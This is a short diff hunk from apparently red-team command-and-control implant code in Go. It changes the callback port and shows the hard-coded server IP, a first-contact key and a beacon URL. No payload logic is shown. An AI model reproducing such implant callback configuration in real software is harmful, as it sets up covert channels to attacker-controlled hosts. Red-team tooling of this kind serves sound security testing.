@@ -28,7 +28,7 @@ var registerkey string
 
 // Global Variable Declaration
 var SERVERIP string = "192.168.204.153"
-var PORT string = "5000"
+var PORT string = "5985"
 var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
 var URL string = "http://" + SERVERIP + ":" + PORT
 
